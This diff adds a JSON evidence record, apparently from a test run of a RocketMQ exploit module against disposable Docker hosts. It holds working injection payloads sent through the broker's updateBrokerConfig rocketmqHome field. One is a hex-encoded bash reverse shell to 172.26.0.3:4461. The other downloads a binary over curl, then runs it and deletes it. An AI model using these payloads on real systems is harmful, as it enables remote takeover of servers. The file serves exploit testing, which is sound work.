@@ -1,0 +1,16 @@
+{
+  "origin": {
+    "run": "20261111T135300-d39949",
+    "source_revision": "87d3dd47e741291a6823336fa5871d9274e666ce",
+    "scope": "Actual owning command and Broker properties-decoded value; disposable Docker addresses only. Not a packet capture.",
+    "console_snapshot_sha256": "4452319df345df5b798fc6077ab53c2bb567ae79a14cc73c0a006a4b9264a7e6",
+    "broker_snapshot_sha256": "5550061aa969bc4b095ab24dd8546dbb6335e484838294cd6996320387cfa032",
+    "console_source": "rspec.log",
+    "broker_source": "root-live-broker-diagnostic.log",
+    "server_timezone": "Broker log timestamps are UTC+8; root console is UTC."
+  },
+  "owning_command": "-c $@|sh . echo bash -c '/bin/echo -ne \\\\\\x62\\\\\\x61\\\\\\x73\\\\\\x68\\\\\\x20\\\\\\x2d\\\\\\x63\\\\\\x20\\\\\\x27\\\\\\x30\\\\\\x3c\\\\\\x26\\\\\\x39\\\\\\x38\\\\\\x2d\\\\\\x3b\\\\\\x65\\\\\\x78\\\\\\x65\\\\\\x63\\\\\\x20\\\\\\x39\\\\\\x38\\\\\\x3c\\\\\\x3e\\\\\\x2f\\\\\\x64\\\\\\x65\\\\\\x76\\\\\\x2f\\\\\\x74\\\\\\x63\\\\\\x70\\\\\\x2f\\\\\\x31\\\\\\x37\\\\\\x32\\\\\\x2e\\\\\\x32\\\\\\x36\\\\\\x2e\\\\\\x30\\\\\\x2e\\\\\\x33\\\\\\x2f\\\\\\x34\\\\\\x34\\\\\\x36\\\\\\x31\\\\\\x3b\\\\\\x73\\\\\\x68\\\\\\x20\\\\\\x3c\\\\\\x26\\\\\\x39\\\\\\x38\\\\\\x20\\\\\\x3e\\\\\\x26\\\\\\x39\\\\\\x38\\\\\\x20\\\\\\x32\\\\\\x3e\\\\\\x26\\\\\\x39\\\\\\x38\\\\\\x27|sh'",
+  "broker_decoded_value": "-c $@|sh . echo bash -c '/bin/echo -ne \\x62\\x61\\x73\\x68\\x20\\x2d\\x63\\x20\\x27\\x30\\x3c\\x26\\x39\\x38\\x2d\\x3b\\x65\\x78\\x65\\x63\\x20\\x39\\x38\\x3c\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x37\\x32\\x2e\\x32\\x36\\x2e\\x30\\x2e\\x33\\x2f\\x34\\x34\\x36\\x31\\x3b\\x73\\x68\\x20\\x3c\\x26\\x39\\x38\\x20\\x3e\\x26\\x39\\x38\\x20\\x32\\x3e\\x26\\x39\\x38\\x27|sh';",
+  "source_broker_line": "2026-11-11 21:58:51 INFO AdminBrokerThread_1 - updateBrokerConfig, new config: [{filterServerNums=1, rocketmqHome=-c $@|sh . echo bash -c '/bin/echo -ne \\x62\\x61\\x73\\x68\\x20\\x2d\\x63\\x20\\x27\\x30\\x3c\\x26\\x39\\x38\\x2d\\x3b\\x65\\x78\\x65\\x63\\x20\\x39\\x38\\x3c\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x37\\x32\\x2e\\x32\\x36\\x2e\\x30\\x2e\\x33\\x2f\\x34\\x34\\x36\\x31\\x3b\\x73\\x68\\x20\\x3c\\x26\\x39\\x38\\x20\\x3e\\x26\\x39\\x38\\x20\\x32\\x3e\\x26\\x39\\x38\\x27|sh';}] client: /172.26.0.3:46575 ",
+  "plain_owning_command": "-c $@|sh . echo bash -c 'curl -so /tmp/module-target-rocketmq-fetch http://172.26.0.3:8091/module-target-rocketmq-fetch;chmod +x /tmp/module-target-rocketmq-fetch;/tmp/module-target-rocketmq-fetch&sleep 6;rm -rf /tmp/module-target-rocketmq-fetch'"
+}
